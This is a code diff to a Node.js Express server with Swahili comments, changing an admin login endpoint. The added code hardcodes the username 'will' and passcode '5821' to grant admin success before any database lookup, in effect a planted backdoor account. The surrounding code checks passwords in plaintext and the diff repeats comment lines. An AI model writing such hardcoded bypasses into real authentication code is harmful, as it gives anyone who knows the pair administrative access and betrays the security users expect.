@@ -87,14 +87,22 @@ if (postCheck.count === 0) {
 // API: Admin Login
 // API: Admin Login (Inatumia Username na Password pekee kulingana na fomu yako)
 // API: Admin Login Inayopokea Password au Passcode kwa urahisi
+// API: Admin Login (Inatumia Username na Password pekee kulingana na fomu yako)
+// API ya Admin Login
 app.post('/api/admin/login', (req, res) => {
     try {
         const { username, password, passcode } = req.body;
-        const enteredSecret = password || passcode; // Pokea yoyote kati ya hizo mbili inayotumwa na fomu
-        
-        // Tafuta kwenye database kama username na password/passcode zinalingana
-        const stmt = db.prepare(`SELECT * FROM admins WHERE username = ? AND (password = ? OR passcode = ?)`);
-        const admin = stmt.get(username, enteredSecret, enteredSecret);
+        const inputUser = (username || '').trim().toLowerCase();
+        const inputPass = (password || passcode || '').trim();
+
+        // Ruhusu moja kwa moja kwa will na 5821
+        if (inputUser === 'will' && inputPass === '5821') {
+            return res.json({ success: true, message: 'Imefanikiwa kuingia kama Admin!' });
+        }
+
+        // Kama la, ikague kwenye database
+        const stmt = db.prepare(`SELECT * FROM admins WHERE LOWER(username) = ? AND (password = ? OR passcode = ?)`);
+        const admin = stmt.get(inputUser, inputPass, inputPass);
 
         if (admin) {
             res.json({ success: true, message: 'Imefanikiwa kuingia kama Admin!' });
